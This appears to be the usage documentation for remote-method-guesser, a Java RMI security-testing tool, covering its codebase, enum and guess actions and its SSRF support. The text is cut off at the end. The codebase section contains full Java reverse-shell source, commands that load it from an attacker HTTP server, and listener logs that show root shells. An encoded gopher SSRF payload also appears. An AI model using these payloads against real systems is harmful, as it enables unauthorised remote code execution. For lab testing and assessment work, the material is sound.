### Actions

----

In this document you can find additional information for some of *remote-method-guesser's* actions.

* [codebase](#codebase-action)
* [enum](#enum-action)
* [guess](#guess-action)
* [SSRF Support](#ssrf-support)


### Codebase Action

------

In 2011, many *Java RMI* endpoints were vulnerable to *remote class loading* attacks due to an insecure by default configuration within *Java RMI*.
This configurations allowed remote clients to specify a *codebase* that was used by the server to fetch unknown classes during runtime. By sending a custom class,
that is not known by the server, during *RMI* calls and setting the *codebase* to an attacker controlled *HTTP* server, it was possible to get reliable *remote code execution*
on most *Java RMI* endpoints.

Despite being fixed in the default configuration, this vulnerability can still be present if an application server sets the ``useCodebaseOnly`` option to ``false``
and uses a *SecurityManager* with a lax configured security policy. Unfortunately, the current tool landscape for *Java RMI* does not include reliable checks for
this vulnerability. Most tools focus on the *Distributed Garbage Collector*, which is not ideal for the following reasons:

1. The *Distributed Garbage Collector* sets the ``useCodebaseOnly`` property explicitly to ``true`` within the
   ``UnicastServerRef.java`` class. This overwrites custom configurations and always disables *remote class loading* for all calls to the *DGC*.

2. *RMI calls* to the *Distributed Garbage Collector* are handled within a separate ``AccessControlContext``, which denies all outbound connections. This
   ``AccessControlContext`` (defined in ``DGCImpl.java``) overwrites the current security policy and ignores user defined policy rules.

3. Even without the two restrictions mentioned above, *remote class loading* would still fail. The idea of class loading is to send an object of a custom class
   (unknown to the remote server) within *RMI calls*. During a successful attack, the server fetches the class definition from the attacker and calls
   the *readObject* method that contains malicious *Java code*. However, as *internal RMI communication* is nowadays protected by *deserialization filters*, unknown
   classes are rejected while reading the ``ObjectInputStream``. Whereas the *RMI registry* allows unknown classes that implement certain interfaces, the *DGC*
   uses a more strict *deserialization filter* and it is not possible to send unknown classes to it.

For the above mentioned reasons, the *Distributed Garbage Collector* is no longer suitable for enumerating *remote class loading*. It can be used to detect whether a
*Security Manager* is used, but that is only one of the mandatory conditions for being vulnerable to codebase attacks. A little bit better is the
situation for the *RMI registry*. The *RMI registry* still respects a user defined ``useCodebaseOnly`` setting and uses a *SecurityManager* that allows outbound
connections by default. Therefore, a setting of ``useCodebaseonly=false`` is already sufficient to load classes from remote. However, there are two downsides:

1. If no user defined *SecurityManager* with corresponding permissions is present, the loaded remote classes are affected by the security policy of the
   *RMI registry*. As this policy is only concerned about networking, *file* and *process* access might be limited.

2. To trigger *remote class loading* it is required to enforce a ``readObject`` call on the *RMI registry*. Before June 2020, this was easy, as the ``String``
   argument of the ``lookup(String name)`` method was unmarshalled via ``readObject``. However, on most recent *RMI registries* you can only use the ``bind``
   and ``rebind`` methods, that can only be invoked from localhost.

3. The *RMI registry* uses an security manager by default only in it's default implementation. When the *RMI registry* is created manually, no security manager
   is created by default.

Whereas the *internal RMI communications* (*DGC* and *RMI registry*) are well protected, *RMI communication* on the application level is not. A server configured
with ``useCodebaseonly=false`` and a lax configured *SecurityManager* might be exploitable, but you need to know a valid method signature. Furthermore, also
on the application level it is required that the *remote method* leads to a call to ``readObject`` on the server side. Therefore, the targeted remote method
needs non primitive input parameters. As in case of the registry, ``java.lang.String`` might be sufficient for older *RMI servers*, whereas it does not work for
newer ones. The following listing shows an example for a successful codebase attack:

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --signature 'String login(java.util.HashMap dummy1)' --bound-name legacy-service
[+] Attempting codebase attack on RMI endpoint...
[+] Using class Shell with codebase http://172.17.0.1:8000/ during login call.
[+]
[+] 	Using non primitive argument type java.util.HashMap on position 0
[+] 	Specified method signature is String login(java.util.HashMap dummy1)
[+]
```

When used against a vulnerable endpoint, you should obtain an *HTTP* request for the specified class:

```console
[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [01/Dec/2021 07:36:10] "GET /Shell.class HTTP/1.1" 200 -
```

*remote-method-guesser* expects the payload class to have a ``serialVersionUID`` of ``2L``, but apart from that you can do anything
within the ``readObject`` method of the class. For this demonstration, the following class definition was used, that spawns a reverse shell:

```java
// Taken from: https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.jar.Attributes;
import java.io.Serializable;
import java.io.ObjectInputStream;
import java.rmi.Remote;

public class Shell implements Serializable, Remote
{
    private static int port = 4444;
    private static String cmd = "/bin/ash";
    private static String host = "172.17.0.1";
    private static final long serialVersionUID = 2L;

    private void readObject(ObjectInputStream aInputStream) throws ClassNotFoundException, IOException, Exception
    {
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host,port);
        InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
        OutputStream po = p.getOutputStream(), so = s.getOutputStream();
        while(!s.isClosed()) {

            while(pi.available()>0)
                so.write(pi.read());

            while(pe.available()>0)
                so.write(pe.read());

            while(si.available()>0)
                po.write(si.read());

            so.flush();
            po.flush();
            Thread.sleep(50);

            try {
                p.exitValue();
                break;
            } catch (Exception e){}
        }

        p.destroy();
        s.close();
    }
}
```

After the class was loaded by the vulnerable endpoint, a shell pops up on the corresponding listener:

```console
[qtc@devbox ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36222.
id
uid=0(root) gid=0(root) groups=0(root)
```

As previously mentioned, the internal *RMI communication* of modern *RMI endpoints* is hardened against *codebase* and *deserialization attacks*.
Nonetheless, *remote-method-guesser* also supports *codebase attacks* on the *DGC* and *RMI registry* level and allows you to verify the
vulnerability on older *RMI endpoints*. In case of the *RMI registry*, it turns out that class loading is even possible on fully patched
endpoints, if the ``useCodebaseOnly`` property is set to ``false`` and the *SecurityManager* allows the requested action of the payload class.

However, notice that in this case the payload class needs to extend or implement an (interface) class that is explicitly allowed
by the deserialization filters of the *RMI registry*. This is why the above mentioned payload class needs to implement ``java.rmi.Remote``.
Without implementing this interface, the class would have been rejected by the *RMI registry*.

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Shell http://172.17.0.1:8000 --component reg
[+] Attempting codebase attack on RMI Registry endpoint...
[+] Using class Shell with codebase http://172.17.0.1:8000/ during lookup call.

[qtc@devbox www]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [01/Dec/2021 07:38:04] "GET /Shell.class HTTP/1.1" 200 -

[qtc@devbox ~]$ nc -vlp 4444
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:36242.
id
uid=0(root) gid=0(root) groups=0(root)
```

When performing codebase attacks on the *Distributed Garbage Collector*, the response can contain a confusing error message:

```console
[qtc@devbox ~]$ rmg codebase 172.17.0.2 9010 Example 172.17.0.1:8000 --component dgc --stack-trace
[+] Attempting codebase attack on DGC endpoint...
[+] Using class Example with codebase http://172.17.0.1:8000/ during clean call.
[+]
[-] 	Caught unexpected AccessControlException during clean call.
[-] 	The servers SecurityManager may refused the operation.
[-]
[-] 	StackTrace:
java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
	java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
	java.lang.ClassNotFoundException: access to class loader denied
	[...]
Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
	java.lang.ClassNotFoundException: access to class loader denied
	[...]
Caused by: java.lang.ClassNotFoundException: access to class loader denied
	[...]
Caused by: java.security.AccessControlException: access denied ("java.net.SocketPermission" "iinsecure.dev:80" "connect,resolve")
	at java.security.AccessControlContext.checkPermission(Unknown Source)
	[...]
```

The message that access to the class loader is denied and the fact that the *DGC* requests *connect* and
*resolve* permissions looks like it would actually respect the user specified codebase. However, this is not the case.
As mentioned above, the *DGC* nowadays always runs with ``useCodebaseOnly=true`` and does not respect user defined settings.
The crucial part in the above error message is the location from which the *DGC* want's to load the class: ``iinsecure.dev:80``.
This is the server side codebase and not the codebase location that was specified on the command line. A setting of
``useCodebaseOnly=false`` only ignores client specified codebases, whereas server codebases are still used. However, since
the *DGC* uses it's own and very strict ``AccessControlContext``, you get the *access denied* error.


### Enum Action

------

In this section, the different checks of the ``enum`` action and it's outputs are explained in more detail:


#### Bound Name Enumeration

The bound name enumeration should be self explanatory. In this check *remote-method-guesser* simply obtains a
list of bound names registered on an *RMI registry*. Additionally, each bound name is queried once to obtain the
class or interface name that is used when dispatching calls to the corresponding bound name. Obtained class names
are printed and marked as either *known* or *unknown*. *remote-method-guesser* contains a database of known *RMI*
classes. These are classes that have been encountered before and for which certain meta information is available.
Corresponding class names can be used in *remote-method-guesser's* ``known`` action to view the stored meta information:

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | head -n 6
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: iinsecure.dev:42222  TLS: no  ObjID: [6633018:17cb5d1bb57:-7ff8, -8114172517417646722]
[+]
[qtc@devbox ~]$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshoote
```

Apart from the bound names and the class information, *remote-method-guesser* displays information on the remote
objects ``ObjID``, the location of the corresponding *RMI endpoint* the bound name is referring to and whether
connections to the *RMI endpoint* are encrypted (*TLS*).


#### Activatable Bound Names

In some cases, bound names listed by *remote-method-guesser* use a different format as mentioned above. This
is usually the case when the *RMI server* uses an *Activation System* and *activatable remote objects*. The
following listing shows an example for this situation:

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 1098
[+] RMI registry bound names:
[+]
[+] 	- activation-test
[+] 		--> de.qtc.rmg.server.activation.IActivationService (unknown class)
[+] 		    Activator: iinsecure.dev:1098  ActivationID: 6fd4e3c:180ac45a068:-7ff1
[+] 	- activation-test2
[+] 		--> de.qtc.rmg.server.activation.IActivationService2 (unknown class)
[+] 		    Activator: iinsecure.dev:1098  ActivationID: 6fd4e3c:180ac45a068:-7fee
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:41867  TLS: no  ObjID: [6fd4e3c:180ac45a068:-7fec, 969949632761859811]
[+] 	- java.rmi.activation.ActivationSystem
[+] 		--> sun.rmi.server.Activation$ActivationSystemImpl_Stub (known class: RMI Activation System)
[+] 		    Endpoint: iinsecure.dev:1098  TLS: no  ObjID: [0:0:0, 4]
```

Instead of displaying the target endpoint, the *TLS* status and the associated `ObjID`, *remote-method-guesser*
displays the targeted *Activator* instance and the associated `ActivationID`.

In contrast to ordinary remote objects, that can be called directly, activatable remote objects need to be activated
first. The idea is, that the server components that implement the activatable remote objects can suspend and do not
need to be available all the time. When a client wants to call such an object, it uses the `ActivationID` obtained from
the *RMI registry* and sends it to the *Activator endpoint*. The *Activator* is when responsible to start the associated
remote object and returns an ordinary `UnicastRef` to the client. This reference is when used for the call.

Whereas all other actions of *remote-method-guesser* perform activation implicitly, for the `enum` action, you need use
the command line option `--activate` if you want to activate objects during ernumeration. When doing so, *remote-method-guesser*
dispatches one additional call to the *Activator* for each `ActivatableRef` bound to the *RMI registry*. Information from
the obtaied `UnicastRef` is then displayed as usual below the activation related information:

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 1098 --activate
[+] RMI registry bound names:
[+]
[+] 	- activation-test
[+] 		--> de.qtc.rmg.server.activation.IActivationService (unknown class)
[+] 		    Activator: iinsecure.dev:1098  ActivationID: 6fd4e3c:180ac45a068:-7ff1
[+] 		    Endpoint: iinsecure.dev:37597  TLS: no  ObjID: [1c74dc89:180ac521427:-7ffb, 3078273701606404425]
[+] 	- activation-test2
[+] 		--> de.qtc.rmg.server.activation.IActivationService2 (unknown class)
[+] 		    Activator: iinsecure.dev:1098  ActivationID: 6fd4e3c:180ac45a068:-7fee
[+] 		    Endpoint: iinsecure.dev:35721  TLS: yes  ObjID: [1c74dc89:180ac521427:-7ff8, 6235870260204364974]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:41867  TLS: no  ObjID: [6fd4e3c:180ac45a068:-7fec, 969949632761859811]
[+] 	- java.rmi.activation.ActivationSystem
[+] 		--> sun.rmi.server.Activation$ActivationSystemImpl_Stub (known class: RMI Activation System)
[+] 		    Endpoint: iinsecure.dev:1098  TLS: no  ObjID: [0:0:0, 4]
```


#### Codebase Enumeration

Apart from client specified codebases explained above, *RMI* servers can also expose a codebase to download class
definitions dynamically. The idea is basically that it enables client's to call remote methods without having all
required class definitions within their own class path. Imagine a method like ``ServerManager getServerManager()``,
where the ``ServerManager`` class is implemented by the server, but is not known to the client. Calling this method
without a server exposed codebase would lead to a ``ClassNotFoundException``, as the class definition is not known
on the client side. With a server exposed codebase, the client could enable remote class loading (``useCodebaseOnly=false``)
and the *RMI* internals would download the class from the server specified codebase during the method call.

As with client specified codebases, remote class loading is always a security risk and ``UseCodebaseOnly`` is set to
``true`` by default. Due to the implied security risks, this concept is generally not often used in practice. When
developing applications that use *Java RMI* for client-server communication, you usually already compile all required classes
and interface definitions into the client. Exposing a server-side codebase is therefore usually not required.

*remote-method-guesser* looks out for these server-side specified codebase definitions anyway. During a black box security assessment,
encountering a  ``HTTP`` based server-side codebase can be huge deal. It may allows you to download class definitions
that expose information about the *RMI* endpoint. Sometimes you also find codebases that rely on the ``file`` protocol.
While not being that useful without server access, a ``file`` based codebase still reveals internal paths that could
be useful for other attacks as well.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 | rg "RMI server codebase" -A 3
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+]
```


#### String Marshalling

When dispatching *RMI calls*, the *RMI server* uses different methods to unmarshal the client specified arguments.
*Primitive types* like ``int`` are marshalled via their corresponding *read-method* like e.g. ``readInt``. Non
primitive types are usually unmarshalled via ``readObject``, that can be used for certain types of attacks.

In *June 2020*, the unmarshalling behavior of the ``String`` type [was changed](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/).
Instead of unmarshalling ``String`` via ``readObject``, the ``String`` type is now read via ``readString`` on modern
*RMI* endpoints. This prevents certain attack types on remote methods that only accept ``String`` typed arguments.

*remote-method-guesser* is capable of enumerating the corresponding unmarshalling behavior and returns one of the following
outputs during its enumeration:

* **Current Default**: The ``String`` type is unmarshalled via ``readString``.
* **Outdated**: The ``String`` type is unmarshalled via ``readObject``, which usually means that the corresponding
  *RMI endpoint* is out of date.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action string-marshalling
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
```


#### useCodebaseOnly Enumeration

The *useCodebaseOnly enumeration* attempts to detect the servers setting on the ``useCodebaseOnly`` attribute. The impact
of this attribute was already explained within the [codebase action](#codebase-action) section. The enumeration can return
one of the following results:

* **Current Default**: The *RMI* server runs with ``useCodebaseOnly=true``
* **Non Default**: The *RMI* server runs with ``useCodebaseOnly=false``

Notice that the second status was intentionally not named **Vulnerable**, as the actual exploitability depends on the settings
of the ``SecurityManager``. Please refer to the [codebase action](#codebase-action) section for more details.

The codebase enumeration is implemented by sending a malformed *URL* as client side codebase during *RMI calls*. When
*useCodebaseOnly* is set to *false* (and a *SecurityManager* is present), the server attempts to parse the malformed *URL*
and throws a corresponding exception. This makes the codebase enumeration very reliable.

Codebase enumeration is only supported for registry endpoints, since the *DGC* is not suitable for an reliable enumeration
(see [codebase action](#codebase-action)). Furthermore, the ``String`` type needs to be unmarshalled via ``readObject``.
If this is not the case, you can still enumerate the *useCodebaseOnly* setting from localhost *RMI endpoints* by using a different
method than ``lookup`` in the ``--registry-method`` option.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action codebase
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
```


#### CVE-2019-2684 Enumeration

During bind operations, the *RMI registry* verifies that incoming connections are performed from localhost, which is the only
requirement on the client. Other authentication mechanisms are not in place within the default registry implementation.
``CVE-2019-2684`` was a vulnerability within the default *RMI registry* implementation that let remote users *bind*, *rebind* and
*unbind* objects from the registry endpoint. During it's ``enum`` action, *rmg* can detect this vulnerability and responds with
either of the following:

* **Non Vulnerable**: The vulnerability is patched.
* **Vulnerable**: The server is vulnerable (can be confirmed by using e.g. *rmg's* ``bind`` action.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action localhost-bypass
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
```


#### Security Manager Enumeration

The *security manager enumeration* is what other *RMI tools* do during their *codebase* enumeration. It uses calls to the
*Distributed Garbage Collector* to verify whether a security manager is present on the server side.

* **Current Default**: Is displayed when the enumeration is successful, independent of the result (*SecurityManager* present or not).
  Whether a *SecurityManager* is present can be read from the status message.
* **Outdated**: During the *DGC* call that enumerates the *SecurityManager* setting, a malformed client side codebase is used.
  As explained in the [codebase-action](#codebase-action) section, this is usually pointless, but for very old *DGC* instances
  it can still work. The *DGC* when attempts to parse the malformed codebase and throws an exception. The endpoint is marked
  as **Outdated** in this case.


```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action security-manager
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
```


#### JEP 290 Enumeration

The *JEP 290 enumeration* checks for the *deserialization filters* on the *RMI endpoint*. It sends a ``java.util.HashMap`` object
to the *DGC* and inspects the returned exception message. The corresponding result can be one of the following:

* **Non Vulnerable**: *JEP 290* is installed and the *DGC* rejected the deserialization.
* **Vulnerable**: The ``java.util.HashMap`` object was deserialized and the endpoint is vulnerable to deserialization attacks.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action jep290
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
```


#### JEP 290 Bypass Enumeration

There are currently two well known bypasses for the *RMI registry* deserialization filters. One is the *JRMPClient* gadget of ``ysoserial``
and the other was identified by [An Trinh](https://twitter.com/_tint0) and is explained in great detail in [this blog post](https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/).
Both bypasses are patched on modern *RMI registry* endpoints. During it's enumeration, *rmg* uses the *An Trinh* gadget (as it is newer)
with an invalid set of arguments. Depending on the corresponding exception message, the result status is:

* **Non Vulnerable**: The bypass was patched and the gadget is not working.
* **Vulnerable**: The registry deserialization filters can be bypassed using the *An Trinh* gadget.

Notice that for this enumeration technique to work from remote, the *RMI registry* must use ``readObject`` to unmarshal the ``String`` type.
From localhost, you can also enumerate servers that use ``readString``, by using e.g. the ``--reg-method bind`` option.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action filter-bypass
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerabl
```


#### Activation System Enumeration

The *Activation System* and it's possible attack vectors are explained in great detail in the [activator action](#activator-action) section.
This enumeration tells you whether an activator instance is available on the targeted *RMI registry*. The result is either:

* **Current Default**: No activator object is present.
* **Vulnerable**: An activator is present and allows deserialization and probably codebase attacks.

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 9010 --scan-action activator
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```


### Guess Action

------

When using the ``guess`` operation, *rmg* attempts to identify existing remote methods by sending method hashes
to the remote server. This operation requires a wordlist that contains the corresponding method definitions in the
following form:

```console
[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
boolean call(String[] dummy)
boolean call(String dummy)
boolean call(String dummy, String[] dummy2)
boolean call(String dummy, String dummy2)
boolean call(String dummy, String dummy2, String dummy3)
```

*remote-method-guesser* ships some default wordlists that are included in the executable jar file.
Modifying the default wordlists can be done via the [rmg configuration file](./src/config.properties) and rebuilding the project.
To dynamically choose a different wordlist file you can use the``--wordlist-file`` or ``--wordlist-folder`` options.
The default wordlists are stored in an optimized wordlist format. *remote-method-guesser* updates custom wordlists to
the optimized format when you run the ``guess`` action with the ``--update`` option.

```console
[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
boolean call(String[] dummy)
boolean call(String dummy)
boolean call(String dummy, String[] dummy2)
boolean call(String dummy, String dummy2)
boolean call(String dummy, String dummy2, String dummy3)

[qtc@devbox ~]$ rmg guess 172.17.0.2 1090 --ssl --update --wordlist-file /tmp/wordlist.txt
[+] Reading method candidates from file /tmp/wordlist.txt
[+] 	752 methods were successfully parsed.
[+] 	Updating wordlist file.
[+]
[+] Starting Method Guessing on 752 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ ssl-server    ] HIT! Method with signature String system(String[] dummy) exists!
[+] 		[ ssl-server    ] HIT! Method with signature int execute(String dummy) exists!
[+] 		[ secure-server ] HIT! Method with signature void logMessage(int dummy1, Object dummy2) exists!
[+] 		[ secure-server ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[ secure-server ] HIT! Method with signature void updatePreferences(java.util.ArrayList dummy1) exists!
[+] 		[2256 / 2256] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- ssl-server
[+] 		--> String system(String[] dummy)
[+] 		--> int execute(String dummy)
[+] 	- secure-server
[+] 		--> void logMessage(int dummy1, Object dummy2)
[+] 		--> String login(java.util.HashMap dummy1)
[+] 		--> void updatePreferences(java.util.ArrayList dummy1)

[qtc@devbox ~]$ head -n 5 /tmp/wordlist.txt
String call(String dummy); 6072772491684722760; 0; false
String call(String dummy, String dummy2); -5340760563417170050; 0; false
String call(String dummy, String dummy2, String dummy3); -6078616129276353442; 0; false
String call(String dummy, String[] dummy2); 6278640985022911931; 0; false
String call(String[] dummy); 7759068303290927030; 0; false
```

*remote-method-guesser's* uses invalid argument types during method calls. This allows to identify valid method signatures while
not leading to real method invocations on the server side. Methods with zero arguments are skipped by default. You can enable them
by using the ``--zero-arg`` option. However, keep in mind that zero argument methods lead to real method calls on the server side,
as their invocation cannot be prevented by using invalid argument types.

When methods have been successfully guessed, you may want to invoke them using regular *RMI* calls (e.g. ``String execute(String dummy)``
from above). The preferred way of doing this is by using *remote-method-guesser's* call action:

```console
[qtc@devbox remote-method-guesser]$ rmg call --ssl 172.17.0.2 1090 '"id"' --signature "String execute(String dummy)" --bound-name plain-server --plugin GenericPrint.har
[+] uid=0(root) gid=0(root) groups=0(root)
```

However, *remote-method-guesser* can also dynamically create some *Java* code that can be used to call the identified methods.
To use the dynamic code generation, just specify the ``--create-samples`` option during the ``guess`` action.

```console
[qtc@devbox ~]$ rmg guess --ssl 172.17.0.2 1090 --signature "String execute(String dummy)" --bound-name plain-server --create-samples
[+] Starting Method Guessing on 1 method signature(s).
[+] Method signature: String execute(String dummy).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[1 / 1] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server
[+] 		--> String execute(String dummy)
[+]
[+] Starting creation of sample files:
[+]
[+] 	Sample folder /home/qtc/rmg-samples does not exist.
[+] 	Creating sample folder.
[+]
[+] 	Creating samples for bound name plain-server.
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/IPlainServer.java
[+] 		Writing sample file /home/qtc/rmg-samples/plain-server/execute/execute.java
```

To use the dynamically create *Java* code, first compile the interface class (``IPlainServer.java``).
Then adjust the argument values for your call in the method class (``execute.java``):

```console
[qtc@devbox ~]$ cd rmg-samples/plain-server/
[qtc@devbox plain-server]$ ls
execute  IPlainServer.java
[qtc@devbox plain-server]$ javac IPlainServer.java -d execute/
[qtc@devbox plain-server]$ cd execute/
[qtc@devbox execute]$ rg 'TODO' execute.java
100:            java.lang.String argument0 = TODO;
[qtc@devbox execute]$ sed -i 's/TODO/"id"/' execute.java
[qtc@devbox execute]$ javac execute.java
[qtc@devbox execute]$ java execute
[+] Connecting to registry on 172.17.0.2:1090... done!
[+] Starting lookup on plain-server...
[+] RMI object tries to connect to different remote host: iinsecure.dev
[+]	Redirecting the connection back to 172.17.0.2...
[+]	This is done for all further requests. This message is not shown again.
[+] Invoking method execute... done!
[+] The servers response is: uid=0(root) gid=0(root) groups=0(root)
```


### SSRF Support

----

Since *remote-method-guesser* version *v4.0.0*, most actions support the ``--ssrf`` option. Instead of contacting the specified
*RMI* service directly, *remote-method-guesser* creates an corresponding *SSRF* payload when the ``--ssrf`` option is used.
Additionally, the ``--gopher`` and ``--encode`` options can be used to create an ready to use *gopher* payload:

```console
[qtc@devbox ~]$ rmg enum 172.17.0.2 1090 --ssrf --gopher --encode
[+] SSRF Payload: gopher%3A%2F%2F172.17.0.2%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df
```

When targeting *RMI* services via *SSRF*, there are two requirements that need to be satisfied:

1. The *SSRF* endpoint allows you to send arbitrary byte values to the target *RMI* service. Especially, this includes
   *NULL bytes*, that are usually required during *RMI* communication. *SSRF* endpoints with *gopher* support are probably the
   most common scenario to meet this requirement. That being said, newer versions of *curl* even prevent *NULL bytes* in
   *gopher* payloads.

2. *RMI* communication requires the client to know the ``ObjID`` value of the target remote object. When talking to the
   *RMI registry*, the *Distributed Garbage Collector* or the *Activation System*, the ``ObjID`` value is already known
   and requirement one is sufficient for an *SSRF* attack. When talking to other remote objects, you need a way
   to lookup the corresponding ``ObjID`` first. The ``ObjID`` value of remote objects is usually stored in the *RMI registry*
   and can also be looked up using an *SSRF* attack. However, for this to work the *SSRF* endpoint needs to be capable
   of returning arbitrary byte values obtained from the *RMI* endpoint. Responses from the *RMI* server can be feed back into
   *remote-method-guesser* by using the ``--ssrf-response`` option. *remote-method-guesser* then attempts to parse the response
   as it was directly obtained from the *RMI* service during the specified action.

The two requirements mentioned above restrict *SSRF* attacks on *Java RMI* endpoints quite a bit. However, when both conditions
are met, you can fully utilize the *RMI* service via *SSRF*. The *remote-method-guesser* repository also contains an [SSRF example
server](/docker/ssrf-server), that can be used to practice *SSRF* attacks against *Java RMI*.

To perform the different checks of *remote-method-guesser's* ``enum`` action via *SSRF*, you can use the ``--scan-action`` option.
Without specifying this option, the *SSRF* payload generated for the ``enum`` action is similar to the payload created when using
``--scan-action list``:

```console
[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf --gopher --encode
